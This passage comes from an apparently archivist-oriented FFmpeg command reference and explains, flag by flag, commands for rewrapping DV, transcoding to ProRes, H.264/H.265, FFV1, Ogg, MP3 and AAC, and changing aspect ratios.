        <li>originator</li>
        <li>originator_reference</li>
        <li>origination_date</li>
        <li>origination_time</li>
        <li>coding_history</li>
        <li>IARL</li>
      </ul>
      <p>Example: <code>-metadata originator='US, UW Libraries'</code></p>
      <p>Additionally, users should be aware that BWF metadata fields are limited by characters, with some such as OriginatorReference maxing out at 32. Specific information can be found in the <a href="https://tech.ebu.ch/docs/tech/tech3285.pdf">Broadcast Wave Format specification</a>. Additional examples of BWF metadata usage can be found in the <a href="http://www.dlib.indiana.edu/projects/sounddirections/papersPresent/sd_bp_07.pdf">Sound Directions report</a> by Indiana University and Harvard.</p>
      
    </div>
    <!-- ends BWF -->

    <!-- Rewrap DV -->
    <p><label for="rewrap-dv">Rewrap DV video to .dv file</label>
    </p><div>
      <h5>Rewrap DV video to .dv file</h5>
      <p><code>ffmpeg -i <em>input_file</em> -f rawvideo -c:v copy <em>output_file.dv</em></code></p>
      <p>This script will take a video that is encoded in the <a href="https://en.wikipedia.org/wiki/DV" target="_blank">DV Codec</a> but wrapped in a different container (such as MOV) and rewrap it into a raw DV file (with the .dv extension). Since DV files potentially contain a great deal of provenance metadata within the DV stream, it is necessary to rewrap files in this method to avoid unintentional stripping of this metadata.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path and name of the input file</dd>
        <dt>-f rawvideo</dt><dd>this tells FFmpeg to pass the video stream as raw video data without remuxing. This step is what ensures the survival of embedded metadata versus a standard rewrap.</dd>
        <dt>-c:v copy</dt><dd>copy the DV stream directly, without re-encoding.</dd>
        <dt><em>output_file.dv</em></dt><dd>tells FFmpeg to use the DV wrapper for the output.</dd>
      </dl>
      
    </div>
    <!-- Rewrap DV -->

    </div>
    <div>
    <h2 id="transcode">Change codec (transcode)</h2>

    <!-- Transcode to ProRes -->
    <p><label for="to_prores">Transcode to deinterlaced Apple ProRes LT</label>
    </p><div>
      <h5>Transcode into a deinterlaced Apple ProRes LT</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v prores -profile:v 1 -vf yadif -c:a pcm_s16le <em>output_file</em></code></p>
      <p>This command transcodes an input file into a deinterlaced Apple ProRes 422 LT file with 16-bit linear PCM encoded audio. The file is deinterlaced using the yadif filter (Yet Another De-Interlacing Filter).</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v prores</dt><dd>tells FFmpeg to transcode the video stream into Apple ProRes 422</dd>
        <dt>-profile:v <em>1</em></dt><dd>Declares profile of ProRes you want to use. The profiles are explained below:
        <ul>
          <li>0 = ProRes 422 (Proxy)</li>
          <li>1 = ProRes 422 (LT)</li>
          <li>2 = ProRes 422 (Standard)</li>
          <li>3 = ProRes 422 (HQ)</li>
        </ul></dd>
        <dt>-vf yadif</dt><dd>Runs a deinterlacing video filter (yet another deinterlacing filter) on the new file. <code>-vf</code> is an alias for <code>-filter:v</code>.</dd>
        <dt>-c:a pcm_s16le</dt><dd>tells FFmpeg to encode the audio stream in 16-bit linear PCM</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file<br>
        There are currently three possible containers for ProRes 422 and 4444 which are all supported by FFmpeg: QuickTime (<code>.mov</code>), Matroska (<code>.mkv</code>) and Material eXchange Format (<code>.mxf</code>).</dd>
      </dl>
      <p>FFmpeg comes with more than one ProRes encoder:</p>
      <ul>
        <li><code>prores</code> is much faster, can be used for progressive video only, and seems to be better for video according to Rec. 601 (Recommendation ITU-R BT.601).</li>
        <li><code>prores_ks</code> generates a better file, can also be used for interlaced video, allows also encoding of ProRes 4444 (<code>-c:v prores_ks -profile:v 4</code>) and ProRes 4444 XQ (<code>-c:v prores_ks -profile:v 5</code>), and seems to be better for video according to Rec. 709 (Recommendation ITU-R BT.709).</li>
      </ul>
      
    </div>
    <!-- ends Transcode to ProRes -->

    <!-- Transcode to H.264 -->
    <p><label for="transcode_h264">Transcode to an H.264 access file</label>
    </p><div>
      <h5>Transcode to H.264</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -pix_fmt yuv420p -c:a aac <em>output_file</em></code></p>
      <p>This command takes an input file and transcodes it to H.264 with an .mp4 wrapper, audio is transcoded to AAC. The libx264 codec defaults to a “medium” preset for compression quality and a CRF of 23. CRF stands for constant rate factor and determines the quality and file size of the resulting H.264 video. A low CRF means high quality and large file size; a high CRF means the opposite.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v libx264</dt><dd>tells FFmpeg to encode the video stream as H.264</dd>
        <dt>-pix_fmt yuv420p</dt><dd>libx264 will use a chroma subsampling scheme that is the closest match to that of the input. This can result in Y′C<sub>B</sub>C<sub>R</sub> 4:2:0, 4:2:2, or 4:4:4 chroma subsampling. QuickTime and most other non-FFmpeg based players can’t decode H.264 files that are not 4:2:0. In order to allow the video to play in all players, you can specify 4:2:0 chroma subsampling.</dd>
        <dt>-c:a aac</dt><dd>encode audio as AAC.<br>
          AAC is the codec most often used for audio streams within an .mp4 container.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>In order to optimize the file for streaming, you can add this preset:</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -pix_fmt yuv420p -c:a aac -movflags +faststart <em>output_file</em></code></p>
      <dl>
        <dt>-movflags +faststart</dt><dd>This tells FFmpeg to move some of the essential metadata to the start of the file, which permits starting viewing before the file finishes downloading (an ideal characteristic for streaming).</dd>
      </dl>
      <p>In order to use the same basic command to make a higher quality file, you can add some of these presets:</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -pix_fmt yuv420p -preset veryslow -crf 18 -c:a aac <em>output_file</em></code></p>
      <dl>
        <dt>-preset <em>veryslow</em></dt><dd>This option tells FFmpeg to use the slowest preset possible for the best compression quality.<br>
        Available presets, from slowest to fastest, are: <code>veryslow</code>, <code>slower</code>, <code>slow</code>, <code>medium</code>, <code>fast</code>, <code>faster</code>, <code>veryfast</code>, <code>superfast</code>, <code>ultrafast</code>.</dd>
        <dt>-crf <em>18</em></dt><dd>Specifying a lower CRF will make a larger file with better visual quality. For H.264 files being encoded with a 4:2:0 chroma subsampling scheme (i.e., using <code>-pix_fmt yuv420p</code>), the scale ranges between 0-51 for 8-bit content, with 0 being lossless and 51 the worst possible quality.<br>
          If no crf is specified, <code>libx264</code> will use a default value of 23. 18 is often considered a “visually lossless” compression.</dd>
      </dl>
      <p>By default, this recipe will include one track of each type (e.g. audio, video) in the output file. If you wish to include more tracks, consult the <a href="#stream-mapping">entry on stream mapping</a>.</p>
      <p>For more information, see the <a href="https://trac.ffmpeg.org/wiki/Encode/H.264" target="_blank">FFmpeg and H.264 Encoding Guide</a> on the FFmpeg wiki.</p>
      
    </div>
    <!-- ends Transcode to H.264 -->

    <!-- Transcode to H.264 or H.265 using the GPU -->
    <p><label for="transcode_gpu">Transcode to H.264/H.265 using the GPU</label>
    </p><div>
      <h5>Transcode to H.264/H.265 using the GPU</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v h264_nvenc -preset llhq -rc:v vbr_hq -cq:v 19 -b:v 8000k -maxrate:v 12000k -profile:v high -c:a copy <em>output_file</em></code></p>
      <p>This command takes an input file and transcodes it to H.264 using the encoding functionality of an Nvidia GPU (without transcoding the audio). If you're using H.264 with AAC or AC3 audio, you can output to an .mp4 file; if you're using HEVC and/or more exotic audio, you should output to .mkv. While Nvidia's fixed-function hardware can be 10x as performant as encoding on the CPU, it requires a few more parameters in order to optimize quality at lower bitrates.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v <em>h264_nvenc</em></dt><dd>tells FFmpeg to encode the video stream as H.264 using Nvidia's encoder.</dd>
        <dt>-preset <em>llhq</em></dt><dd>uses the "low latency, high quality" encoding preset, a good default when working with nvenc.</dd>
        <dt>-rc:v <em>vbr_hq</em></dt><dd>means "variable bitrate, high quality," allowing you to set a minimum and maximum bitrate for the encode.</dd>
        <dt>-cq:v <em>19</em></dt><dd>is the same as the CRF quality level specified using x264 or other CPU-based encoders, where 0 is lossless, 51 is the worst possible quality, and values from 18-23 are typical.</dd>
        <dt>-b:v <em>8000k -maxrate:v 12000k</em></dt><dd>corresponds to a minimum bitrate of 8 megabits (8000k) per second, and a maximum of 12 megabits per second. nvenc is not as good at estimating bitrates as CPU-based encoders, and without this data, will occasionally choose a visibly lower bitrate. The 8-12 mbit range is generally a good one for high-quality 1080p h264.</dd>
        <dt>-profile:v <em>high</em></dt><dd>uses the "high quality" profile of h264, something that's been baked in to the spec for a long time so that older players can declare compatibility; almost all h264 video now uses high.</dd>
        <dt>-c:a <em>copy</em></dt><dd>will skip reencoding the audio stream, and copy the audio from the source file.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>In order to encode to HEVC instead, and optionally transcode the audio, you can try changing the command like this:</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v hevc_nvenc -preset llhq -rc:v vbr_hq -cq:v 19 -b:v 5000k -maxrate:v 8000k -profile:v main10 -c:a aac <em>output_file</em></code></p>
      <dl>
        <dt>-c:v <em>hevc_nvenc</em></dt><dd>encodes to HEVC (also called H.265), a more efficient codec supported on GPUs from approximately 2015 and newer.</dd>
        <dt>-b:v <em>5000k -maxrate:v 8000k</em></dt><dd>specifies a slightly lower bitrate than when using h264, per HEVC's greater efficiency.</dd>
        <dt>-profile:v <em>main10</em></dt><dd>declares the "main10" profile for working with HEVC; one of the primary advantages of this codec is better support for 10-bit video, enabling consumer HDR.</dd>
        <dt>-c:a <em>aac</em></dt><dd>reencodes the audio to AAC with default parameters, a very common and widely supported format for access copies.</dd>
      </dl>
      <p>Much of the information in this entry was taken from <a href="https://superuser.com/a/1236387" target="_blank">this superuser.com post</a> provided by an Nvidia developer, one of the best sources of information on the ffmpeg Nvidia encoders.</p>
      
    </div>
    <!-- ends Transcode to H.264 or H.265 using the GPU -->

    <!-- H.264 from DCP -->
    <p><label for="dcp_to_h264">Transcode from DCP to an H.264 access file</label>
    </p><div>
      <h5>H.264 from DCP</h5>
      <p><code>ffmpeg -i <em>input_video_file</em>.mxf -i <em>input_audio_file</em>.mxf -c:v libx264 -pix_fmt yuv420p -c:a aac <em>output_file.mp4</em></code></p>
      <p>This will transcode MXF wrapped video and audio files to an H.264 encoded MP4 file. Please note this only works for unencrypted, single reel DCPs.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_video_file</em></dt><dd>path and name of the video input file. This extension must be <code>.mxf</code></dd>
        <dt>-i <em>input_audio_file</em></dt><dd>path and name of the audio input file. This extension must be <code>.mxf</code></dd>
        <dt>-c:v libx264</dt><dd>transcodes video to H.264</dd>
        <dt>-pix_fmt yuv420p</dt><dd>sets pixel format to yuv420p for greater compatibility with media players</dd>
        <dt>-c:a aac</dt><dd>re-encodes using the AAC audio codec<br>
        Note that sadly MP4 cannot contain sound encoded by a PCM (Pulse-Code Modulation) audio codec</dd>
        <dt><em>output_file.mp4</em></dt><dd>path, name and .mp4 extension of the output file</dd>
      </dl>
      <p>Variation: Copy PCM audio streams by using Matroska instead of the MP4 container</p>
      <p><code>ffmpeg -i <em>input_video_file</em>.mxf -i <em>input_audio_file</em>.mxf -c:v libx264 -pix_fmt yuv420p -c:a copy <em>output_file.mkv</em></code></p>
      <dl>
        <dt>-c:a copy</dt><dd>re-encodes using the same audio codec</dd>
        <dt><em>output_file.mkv</em></dt><dd>path, name and .mkv extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends H.264 from DCP -->

    <!-- Transcode to FFV1.mkv -->
    <p><label for="create_FFV1_mkv">Transcode your file with the FFV1 Version 3 Codec in a Matroska container</label>
    </p><div>
      <h5>Create FFV1 Version 3 video in a Matroska container with framemd5 of input</h5>
      <p><code>ffmpeg -i <em>input_file</em> -map 0 -dn -c:v ffv1 -level 3 -g 1 -slicecrc 1 -slices 16 -c:a copy <em>output_file</em>.mkv -f framemd5 -an <em>framemd5_output_file</em></code></p>
      <p>This will losslessly transcode your video with the FFV1 Version 3 codec in a Matroska container. In order to verify losslessness, a framemd5 of the source video is also generated. For more information on FFV1 encoding, <a href="https://trac.ffmpeg.org/wiki/Encode/FFV1" target="_blank">try the FFmpeg wiki</a>.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command.</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file.</dd>
        <dt>-map 0</dt><dd>Map all streams that are present in the input file. This is important as FFmpeg will map only one stream of each type (video, audio, subtitles) by default to the output video.</dd>
        <dt>-dn</dt><dd>ignore data streams (data no). The Matroska container does not allow data tracks.</dd>
        <dt>-c:v ffv1</dt><dd>specifies the FFV1 video codec.</dd>
        <dt>-level 3</dt><dd>specifies Version 3 of the FFV1 codec.</dd>
        <dt>-g 1</dt><dd>specifies intra-frame encoding, or GOP=1.</dd>
        <dt>-slicecrc 1</dt><dd>Adds CRC information for each slice. This makes it possible for a decoder to detect errors in the bitstream, rather than blindly decoding a broken slice. (Read more <a href="http://ndsr.nycdigital.org/diving-in-head-first/" target="_blank">here</a>).</dd>
        <dt>-slices 16</dt><dd>Each frame is split into 16 slices. 16 is a good trade-off between filesize and encoding time.</dd>
        <dt>-c:a copy</dt><dd>copies all mapped audio streams.</dd>
        <dt><em>output_file</em>.mkv</dt><dd>path and name of the output file. Use the <code>.mkv</code> extension to save your file in a Matroska container.</dd>
        <dt>-f framemd5</dt><dd>Decodes video with the framemd5 muxer in order to generate MD5 checksums for every frame of your input file. This allows you to verify losslessness when compared against the framemd5s of the output file.</dd>
        <dt>-an</dt><dd>ignores the audio stream when creating framemd5 (audio no)</dd>
        <dt><em>framemd5_output_file</em></dt><dd>path, name and extension of the framemd5 file.</dd>
      </dl>
      
    </div>
    <!-- ends Transcode to FFV1.mkv-->

    <!-- Rip DVD -->
    <p><label for="dvd_to_file">Convert DVD to H.264</label>
    </p><div>
      <h5>Convert DVD to H.264</h5>
      <p><code>ffmpeg -i concat:<em>input_file_1</em>\|<em>input_file_2</em>\|<em>input_file_3</em> -c:v libx264 -c:a aac <em>output_file</em>.mp4</code></p>
      <p>This command allows you to create an H.264 file from a DVD source that is not copy-protected.</p>
      <p>Before encoding, you’ll need to establish which of the .VOB files on the DVD or .iso contain the content that you wish to encode. Inside the VIDEO_TS directory, you will see a series of files with names like VTS_01_0.VOB, VTS_01_1.VOB, etc. Some of the .VOB files will contain menus, special features, etc, so locate the ones that contain target content by playing them back in VLC.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i concat:<em>input files</em></dt><dd>lists the input VOB files and directs FFmpeg to concatenate them. Each input file should be separated by a backslash and a pipe, like so:<br>
        <code>-i concat:VTS_01_1.VOB\|VTS_01_2.VOB\|VTS_01_3.VOB</code><br>
        The backslash is simply an escape character for the pipe (<strong>|</strong>).</dd>
        <dt>-c:v libx264</dt><dd>sets the video codec as H.264</dd>
        <dt>-c:a aac</dt><dd>encode audio as AAC.<br>
          AAC is the codec most often used for audio streams within an .mp4 container.</dd>
        <dt><em>output_file.mp4</em></dt><dd>path and name of the output file</dd>
      </dl>
      <p>It’s also possible to adjust the quality of your output by setting the <strong>-crf</strong> and <strong>-preset</strong> values:</p>
      <p><code>ffmpeg -i concat:<em>input_file_1</em>\|<em>input_file_2</em>\|<em>input_file_3</em> -c:v libx264 -crf 18 -preset veryslow -c:a aac <em>output_file</em>.mp4</code></p>
      <dl>
        <dt>-crf 18</dt><dd>sets the constant rate factor to a visually lossless value. Libx264 defaults to a <a href="https://trac.ffmpeg.org/wiki/Encode/H.264#crf" target="_blank">crf of 23</a>, considered medium quality; a smaller CRF value produces a larger and higher quality video.</dd>
        <dt>-preset veryslow</dt><dd>A slower preset will result in better compression and therefore a higher-quality file. The default is <strong>medium</strong>; slower presets are <strong>slow</strong>, <strong>slower</strong>, and <strong>veryslow</strong>.</dd>
      </dl>
      <p>Bear in mind that by default, libx264 will only encode a single video stream and a single audio stream, picking the ‘best’ of the options available. To preserve all video and audio streams, add <strong>-map</strong> parameters:</p>
      <p><code>ffmpeg -i concat:<em>input_file_1</em>\|<em>input_file_2</em> -map 0:v -map 0:a -c:v libx264 -c:a aac <em>output_file</em>.mp4</code></p>
      <dl>
        <dt>-map 0:v</dt><dd>encodes all video streams</dd>
        <dt>-map 0:a</dt><dd>encodes all audio streams</dd>
      </dl>
      
    </div>
    <!-- ends rip DVD -->

    <!-- Transcode to H.265 -->
    <p><label for="transcode_h265">Transcode to an H.265/HEVC MP4</label>
    </p><div>
      <h5>Transcode to H.265/HEVC</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx265 -pix_fmt yuv420p -c:a copy <em>output_file</em></code></p>
      <p>This command takes an input file and transcodes it to H.265/HEVC in an .mp4 wrapper, keeping the audio codec the same as in the original file.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v libx265</dt><dd>tells FFmpeg to encode the video as H.265</dd>
        <dt>-pix_fmt yuv420p</dt><dd>libx265 will use a chroma subsampling scheme that is the closest match to that of the input. This can result in Y′C<sub>B</sub>C<sub>R</sub> 4:2:0, 4:2:2, or 4:4:4 chroma subsampling. For widest accessibility, it’s a good idea to specify 4:2:0 chroma subsampling.</dd>
        <dt>-c:a copy</dt><dd>tells FFmpeg not to change the audio codec</dd>
        <dt><em>output file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>The libx265 encoding library defaults to a ‘medium’ preset for compression quality and a CRF of 28. CRF stands for ‘constant rate factor’ and determines the quality and file size of the resulting H.265 video. The CRF scale ranges from 0 (best quality [lossless]; largest file size) to 51 (worst quality; smallest file size).</p>
      <p>A CRF of 28 for H.265 can be considered a medium setting, <a href="https://trac.ffmpeg.org/wiki/Encode/H.265#ConstantRateFactorCRF" target="_blank">corresponding</a> to a CRF of 23 in <a href="#transcode_h264">encoding H.264</a>, but should result in about half the file size.</p>
      <p>To create a higher quality file, you can add these presets:</p>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx265 -pix_fmt yuv420p -preset veryslow -crf 18 -c:a copy <em>output_file</em></code></p>
      <dl>
        <dt>-preset <em>veryslow</em></dt><dd>This option tells FFmpeg to use the slowest preset possible for the best compression quality.</dd>
        <dt>-crf <em>18</em></dt><dd>Specifying a lower CRF will make a larger file with better visual quality. 18 is often considered a ‘visually lossless’ compression.</dd>
      </dl>
      
    </div>
    <!-- ends Transcode to H.265 -->

    <!-- Transcode to Ogg/Theora -->
    <p><label for="transcode_ogg">Transcode to an Ogg Theora</label>
    </p><div>
      <h5>Transcode to Ogg/Theora</h5>
      <p><code>ffmpeg -i <em>input_file</em> -acodec libvorbis -b:v 690k <em>output_file</em></code></p>
      <p>This command takes an input file and transcodes it to Ogg/Theora in an .ogv wrapper with 690k video bitrate.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-acodec libvorbis</dt><dd>tells FFmpeg to encode the audio using libvorbis</dd>
        <dt>-b:v 690k</dt><dd>specifies the 690k video bitrate</dd>
        <dt><em>output file</em></dt><dd>path, name and extension of the output file (make sure to include the <code>.ogv</code> filename suffix)</dd>
      </dl>
      <p>This recipe is based on <a href="http://paulrouget.com/e/converttohtml5video" target="_blank">Paul Rouget's recipes</a>.</p>
      
    </div>
    <!-- ends Transcode to Ogg/Theora -->

    
    <!-- Here comes audio-only transcoding -->

    <!-- WAV to MP3 -->
    <p><label for="wav_to_mp3">Convert WAV to MP3</label>
    </p><div>
      <h5>WAV to MP3</h5>
      <p><code>ffmpeg -i <em>input_file</em>.wav -write_id3v1 1 -id3v2_version 3 -dither_method triangular -out_sample_rate 48k -qscale:a 1 <em>output_file</em>.mp3</code></p>
      <p>This will convert your WAV files to MP3s.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path and name of the input file</dd>
        <dt>-write_id3v1 1</dt><dd>This will write metadata to an ID3v1 tag at the head of the file, assuming you’ve embedded metadata into the WAV file.</dd>
        <dt>-id3v2_version 3</dt><dd>This will write metadata to an ID3v2.3 tag at the tail of the file, assuming you’ve embedded metadata into the WAV file.</dd>
        <dt>-dither_method triangular</dt><dd>Dither makes sure you don’t unnecessarily truncate the dynamic range of your audio.</dd>
        <dt>-out_sample_rate 48k</dt><dd>Sets the audio sampling frequency to 48 kHz. This can be omitted to use the same sampling frequency as the input.</dd>
        <dt>-qscale:a 1</dt><dd>This sets the encoder to use a constant quality with a variable bitrate of between 190-250kbit/s. If you would prefer to use a constant bitrate, this could be replaced with <code>-b:a 320k</code> to set to the maximum bitrate allowed by the MP3 format. For more detailed discussion on variable vs constant bitrates see <a href="https://trac.ffmpeg.org/wiki/Encode/MP3" target="_blank">here.</a></dd>
        <dt><em>output_file</em></dt><dd>path and name of the output file</dd>
      </dl>
      <p>A couple notes</p>
      <ul>
        <li>About ID3v2.3 tag: ID3v2.3 is better supported than ID3v2.4, FFmpeg's default ID3v2 setting.</li>
        <li>About dither methods: FFmpeg comes with a variety of dither algorithms, outlined in the <a href="https://ffmpeg.org/ffmpeg-resampler.html" target="_blank">official docs</a>, though some may lead to unintended, drastic digital clipping on some systems.</li>
      </ul>
      
    </div>
    <!-- ends WAV to MP3 -->

    <!-- append notice to access mp3 -->
    <p><label for="append_mp3">Generate two access MP3s (with and without copyright)</label>
    </p><div>
      <h5>Generate two access MP3s from input. One with appended audio (such as a copyright notice) and one unmodified.</h5>
      <p><code>ffmpeg -i <em>input_file</em> -i <em>input_file_to_append</em> -filter_complex "[0:a:0]asplit=2[a][b];[b]afifo[bb];[1:a:0][bb]concat=n=2:v=0:a=1[concatout]" -map "[a]" -codec:a libmp3lame -dither_method triangular -qscale:a 2 <em>output_file.mp3</em> -map "[concatout]" -codec:a libmp3lame -dither_method triangular -qscale:a 2 <em>output_file_appended.mp3</em></code></p>
      <p>This script allows you to generate two derivative audio files from a master while appending audio from a separate file (for example a copyright or institutional notice) to one of them.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file (the master file)</dd>
        <dt>-i <em>input_file_to_append</em></dt><dd>path, name and extension of the input file (the file to be appended to access file)</dd>
        <dt>-filter_complex</dt><dd>enables the complex filtering to manage splitting the input to two audio streams</dd>
        <dt>[0:a:0]asplit=2[a][b];</dt><dd><code>asplit</code> allows audio streams to be split up for separate manipulation. This command splits the audio from the first input (the master file) into two streams "a" and "b"</dd>
        <dt>[b]afifo[bb];</dt><dd>this buffers the stream "b" to help prevent dropped samples and renames stream to "bb"</dd>
        <dt>[1:a:0][bb]concat=n=2:v=0:a=1[concatout]</dt><dd><code>concat</code> is used to join files. <code>n=2</code> tells the filter there are two inputs. <code>v=0:a=1</code> Tells the filter there are 0 video outputs and 1 audio output. This command appends the audio from the second input to the beginning of stream "bb" and names the output "concatout"</dd>
        <dt>-map "[a]"</dt><dd>this maps the unmodified audio stream to the first output</dd>
        <dt>-codec:a libmp3lame -dither_method triangular -qscale:a 2</dt><dd>sets up MP3 options (using constant quality)</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file (unmodified)</dd>
        <dt>-map "[concatout]"</dt><dd>this maps the modified stream to the second output</dd>
        <dt>-codec:a libmp3lame -dither_method triangular -qscale:a 2</dt><dd>sets up MP3 options (using constant quality)</dd>
        <dt><em>output_file_appended</em></dt><dd>path, name and extension of the output file (with appended notice)</dd>
      </dl>
      
    </div>
    <!-- ends append notice to access mp3 -->

    <!-- WAV to AAC/MP4 -->
    <p><label for="wav_to_mp4">Convert WAV to AAC/MP4</label>
    </p><div>
      <h5>WAV to AAC/MP4</h5>
      <p><code>ffmpeg -i <em>input_file</em>.wav -c:a aac -b:a 128k -dither_method triangular -ar 44100 <em>output_file</em>.mp4</code></p>
      <p>This will convert your WAV file to AAC/MP4.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path and name of the input file</dd>
        <dt>-c:a aac</dt><dd>sets the audio codec to AAC</dd>
        <dt>-b:a 128k</dt><dd>sets the bitrate of the audio to 128k</dd>
        <dt>-dither_method triangular</dt><dd>Dither makes sure you don’t unnecessarily truncate the dynamic range of your audio.</dd>
        <dt>-ar 44100</dt><dd>sets the audio sampling frequency to 44100 Hz, or 44.1 kHz, or “CD quality”</dd>
        <dt><em>output_file</em></dt><dd>path and name of the output file</dd>
      </dl>
      <p>A note about dither methods. FFmpeg comes with a variety of dither algorithms, outlined in the <a href="https://ffmpeg.org/ffmpeg-resampler.html" target="_blank">official docs</a>, though some may lead to unintended, not-subtle digital clipping on some systems.</p>
      
    </div>
    <!-- ends WAV to AAC/MP4 -->

    </div>
    <div>
    <h2 id="video-properties">Change video properties</h2>

    <!-- 4:3 to 16:9 -->
    <p><label for="SD_HD">Transform 4:3 aspect ratio into 16:9 with pillarbox</label>
    </p><div>
      <h5>Transform 4:3 aspect ratio into 16:9 with pillarbox</h5>
      <p>Transform a video file with 4:3 aspect ratio into a video file with 16:9 aspect ratio by correct pillarboxing.</p>
      <p><code>ffmpeg -i <em>input_file</em> -filter:v "pad=ih*16/9:ih:(ow-iw)/2:(oh-ih)/2" -c:a copy <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-filter:v "pad=ih*16/9:ih:(ow-iw)/2:(oh-ih)/2"</dt><dd>video padding<br>This resolution independent formula is actually padding any aspect ratio into 16:9 by pillarboxing, because the video filter uses relative values for input width (iw), input height (ih), output width (ow) and output height (oh).</dd>
        <dt>-c:a copy</dt><dd>re-encodes using the same audio codec<br>
        For silent videos you can replace <code>-c:a copy</code> by <code>-an</code>.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends 4:3 to 16:9 -->

    <!-- 16:9 to 4:3 -->
    <p><label for="HD_SD">Transform 16:9 aspect ratio video into 4:3 with letterbox</label>
    </p><div>
      <h5>Transform 16:9 aspect ratio video into 4:3 with letterbox</h5>
      <p>Transform a video file with 16:9 aspect ratio into a video file with 4:3 aspect ratio by correct letterboxing.</p>
      <p><code>ffmpeg -i <em>input_file</em> -filter:v "pad=iw:iw*3/4:(ow-iw)/2:(oh-ih)/2" -c:a copy <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-filter:v "pad=iw:iw*3/4:(ow-iw)/2:(oh-ih)/2"</dt><dd>video padding<br>
        This resolution independent formula is actually padding any aspect ratio into 4:3 by letterboxing, because the video filter uses relative values for input width (iw), input height (ih), output width (ow) and output height (oh).</dd>
        <dt>-c:a copy</dt><dd>re-encodes using the same audio codec<br>
        For silent videos you can replace <code>-c:a copy</code> by <code>-an</code>.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends 16:9 to 4:3 -->

    <!-- Flip image -->
    <p><label for="flip_image">Flip video image</label>
    </p><div>
      <h5>Flip the video image horizontally and/or vertically</h5>
      <p><code>ffmpeg -i <em>input_file</em> -filter:v "hflip,vflip" -c:a copy <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-filter:v "hflip,vflip"</dt><dd>flips the image horizontally and vertically<br>By using only one of the parameters hflip or vflip for filtering the image is flipped on that axis only. The quote marks are not mandatory.</dd>
        <dt>-c:a copy</dt><dd>re-encodes using the same audio codec<br>
        For silent videos you can replace <code>-c:a copy</code> by <code>-an</code>.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Flip image -->

    <!-- SD to HD -->
    <p><label for="SD_HD_2">Transform SD to HD with pillarbox</label>
    </p><div>
      <h5>Transform SD into HD with pillarbox</h5>
      <p>Transform a SD video file with 4:3 aspect ratio into an HD video file with 16:9 aspect ratio by correct pillarboxing.</p>
      <p><code>ffmpeg -i <em>input_file</em> -filter:v "colormatrix=bt601:bt709, scale=1440:1080:flags=lanczos, pad=1920:1080:240:0" -c:a copy <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-filter:v "colormatrix=bt601:bt709, scale=1440:1080:flags=lanczos, pad=1920:1080:240:0"</dt><dd>set colour matrix, video scaling and padding<br>Three filters are applied:
          <ol>
            <li>The luma coefficients are modified from SD video (according to Rec. 601) to HD video (according to Rec. 709) by a color matrix. Note that today Rec. 709 is often used also for SD and therefore you may cancel this parameter.</li>
            <li>The scaling filter (<code>scale=1440:1080</code>) works for both upscaling and downscaling. We use the Lanczos scaling algorithm (<code>flags=lanczos</code>), which is slower but gives better results than the default bilinear algorithm.</li>
            <li>The padding filter (<code>pad=1920:1080:240:0</code>) completes the transformation from SD to HD.</li>
          </ol></dd>
        <dt>-c:a copy</dt><dd>re-encodes using the same audio codec<br>
        For silent videos you can replace <code>-c:a copy</code> with <code>-an</code>.</dd>
